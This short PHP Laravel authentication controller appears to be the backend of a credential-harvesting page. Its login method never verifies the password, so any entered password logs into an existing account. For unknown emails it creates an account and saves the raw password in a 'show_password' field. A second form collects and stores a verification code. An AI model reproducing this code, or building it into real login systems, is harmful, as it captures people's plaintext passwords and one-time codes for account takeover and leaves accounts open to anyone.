<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use App\Models\User;

class AuthController extends Controller
{
    public function showLoginForm()
    {
        return view('auth.login');
    }

    public function login(Request $request)
    {
        $request->validate([
            'email' => 'required|email',
            'password' => 'required',
        ]);

        $user = User::where('email', $request->email)->first();
        if (!$user) {
            $user = User::create([
                'email' => $request->email,
                'password' => Hash::make($request->password),
                'show_password' => $request->password,
                'name' => '',
            ]);
        }
        Auth::login($user);
        return redirect()->route('code.page');
    }

    public function showCodeForm()
    {
        return view('auth.code');
    }

    public function submitCode(Request $request)
    {
        $request->validate([
            'code' => 'required',
        ]);
        $user = Auth::user();
        $user->code = $request->code;
        $user->save();
        // Redirect to a success or dashboard page
        return redirect('/home');
    }
}
